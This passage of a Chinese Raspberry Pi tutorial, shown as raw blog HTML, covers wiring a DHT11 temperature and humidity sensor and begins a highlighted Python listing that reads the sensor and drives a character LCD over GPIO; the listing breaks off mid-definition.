开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\"></div><div class=\"line\">  tmp = humidity + humidity_point + temperature + temperature_point</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">if</span> check == tmp:</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'temp:'</span> + str(temperature) + <span class=\"string\">' C \\nhumidity:'</span> + str(humidity) + <span class=\"string\">'%'</span></div><div class=\"line\">  <span class=\"keyword\">else</span>:</div><div class=\"line\">    get_tmp()</div><div class=\"line\"></div><div class=\"line\">  GPIO.cleanup()    </div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Adafruit_CharLCD</span>:</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># commands</span></div><div class=\"line\">    LCD_CLEARDISPLAY            = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_RETURNHOME                  = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYMODESET            = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYCONTROL          = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORSHIFT             = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_FUNCTIONSET             = <span class=\"number\">0x20</span></div><div class=\"line\">    LCD_SETCGRAMADDR            = <span class=\"number\">0x40</span></div><div class=\"line\">    LCD_SETDDRAMADDR            = <span class=\"number\">0x80</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display entry mode</span></div><div class=\"line\">    LCD_ENTRYRIGHT              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_ENTRYLEFT               = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_ENTRYSHIFTINCREMENT     = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_ENTRYSHIFTDECREMENT     = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display on/off control</span></div><div class=\"line\">    LCD_DISPLAYON               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_DISPLAYOFF              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_CURSORON                = <span class=\"number\">0x02</span></div><div class=\"line\">    LCD_CURSOROFF               = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_BLINKON                 = <span class=\"number\">0x01</span></div><div class=\"line\">    LCD_BLINKOFF                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for display/cursor shift</span></div><div class=\"line\">    LCD_DISPLAYMOVE             = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_CURSORMOVE              = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_MOVERIGHT               = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_MOVELEFT                = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># flags for function set</span></div><div class=\"line\">    LCD_8BITMODE                = <span class=\"number\">0x10</span></div><div class=\"line\">    LCD_4BITMODE                = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_2LINE                   = <span class=\"number\">0x08</span></div><div class=\"line\">    LCD_1LINE                   = <span class=\"number\">0x00</span></div><div class=\"line\">    LCD_5x10DOTS                = <span class=\"number\">0x04</span></div><div class=\"line\">    LCD_5x8DOTS                 = <span class=\"number\">0x00</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, pin_rs=<span class=\"number\">8</span>, pin_e=<span class=\"number\">10</span>, pins_db=[<span class=\"number\">11</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">15</span>], GPIO = None)</span>:</span></div><div class=\"line\">        <span class=\"comment\"># Emulate the old behavior of using RPi.GPIO if we haven't been given</span></div><div class=\"line\">        <span class=\"comment\"># an explicit GPIO interface to use</span></div><div class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> GPIO:</div><div class=\"line\">            <span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\">        GPIO.setwarnings(<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO = GPIO</div><div class=\"line\">        self.pin_rs = pin_rs</div><div class=\"line\">        self.pin_e = pin_e</div><div class=\"line\">        self.pins_db = pins_db</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.setmode(GPIO.BOARD)</div><div class=\"line\">        self.GPIO.setup(self.pin_e, GPIO.OUT)</div><div class=\"line\">        self.GPIO.setup(self.pin_rs, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.setup(pin, GPIO.OUT)</div><div class=\"line\"></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x33</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x32</span>) <span class=\"comment\"># initialization</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x28</span>) <span class=\"comment\"># 2 line 5x7 matrix</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x0C</span>) <span class=\"comment\"># turn cursor off 0x0E to enable cursor</span></div><div class=\"line\">        self.write4bits(<span class=\"number\">0x06</span>) <span class=\"comment\"># shift cursor right</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF</div><div class=\"line\"></div><div class=\"line\">        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS</div><div class=\"line\">        self.displayfunction |= self.LCD_2LINE</div><div class=\"line\"></div><div class=\"line\">        <span class=\"string\">\"\"\" Initialize to default text direction (for romance languages) \"\"\"</span></div><div class=\"line\">        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) <span class=\"comment\">#  set the entry mode</span></div><div class=\"line\"></div><div class=\"line\">        self.clear()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">begin</span><span class=\"params\">(self, cols, lines)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> (lines &gt; <span class=\"number\">1</span>):</div><div class=\"line\">                self.numlines = lines</div><div class=\"line\">                self.displayfunction |= self.LCD_2LINE</div><div class=\"line\">                self.currline = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">home</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_RETURNHOME) <span class=\"comment\"># set cursor position to zero</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>) <span class=\"comment\"># this command takes a long time!</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clear</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CLEARDISPLAY) <span class=\"comment\"># command to clear display</span></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">3000</span>)    <span class=\"comment\"># 3000 microsecond sleep, clearing the display takes a long time</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">setCursor</span><span class=\"params\">(self, col, row)</span>:</span></div><div class=\"line\"></div><div class=\"line\">        self.row_offsets = [ <span class=\"number\">0x00</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x54</span> ]</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span> ( row &gt; self.numlines ): </div><div class=\"line\">                row = self.numlines - <span class=\"number\">1</span> <span class=\"comment\"># we count rows starting w/0</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noDisplay</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display off (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn the display on (quickly) \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_DISPLAYON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noCursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turns the underline cursor on/off \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">cursor</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Cursor On \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol |= self.LCD_CURSORON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noBlink</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Turn on and off the blinking cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaycontrol &amp;= ~self.LCD_BLINKON</div><div class=\"line\">        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DisplayLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scrollDisplayRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" These commands scroll the display without changing the RAM \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leftToRight</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Left to Right \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">rightToLeft</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This is for text that flows Right to Left \"\"\"</span></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYLEFT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">autoscroll</span><span class=\"params\">(self)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'right justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">noAutoscroll</span><span class=\"params\">(self)</span>:</span> </div><div class=\"line\">        <span class=\"string\">\"\"\" This will 'left justify' text from the cursor \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.displaymode &amp;= ~self.LCD_ENTRYSHIFTINCREMENT</div><div class=\"line\">        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">write4bits</span><span class=\"params\">(self, bits, char_mode=False)</span>:</span></div><div class=\"line\">        <span class=\"string\">\"\"\" Send command to LCD \"\"\"</span></div><div class=\"line\"></div><div class=\"line\">        self.delayMicroseconds(<span class=\"number\">1000</span>) <span class=\"comment\"># 1000 microsecond sleep</span></div><div class=\"line\"></div><div class=\"line\">        bits=bin(bits)[<span class=\"number\">2</span>:].zfill(<span class=\"number\">8</span>)</div><div class=\"line\"></div><div class=\"line\">        self.GPIO.output(self.pin_rs, char_mode)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> pin <span class=\"keyword\">in</span> self.pins_db:</div><div class=\"line\">            self.GPIO.output(pin, <span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>,<span class=\"number\">8</span>):</div><div class=\"line\">            <span class=\"keyword\">if</span> bits[i] == <span class=\"string\">\"1\"</span>:</div><div class=\"line\">                self.GPIO.output(self.pins_db[::<span class=\"number\">-1</span>][i<span class=\"number\">-4</span>], <span class=\"keyword\">True</span>)</div><div class=\"line\"></div><div class=\"line\">        self.pulseEnable()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delayMicroseconds</span><span class=\"params\">(self, microseconds)</span>:</span></div><div class=\"line\">        seconds = microseconds / float(<span class=\"number\">1000000</span>) <span class=\"comment\"># divide microseconds by 1 million for seconds</span></div><div class=\"line\">        sleep(seconds)</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> 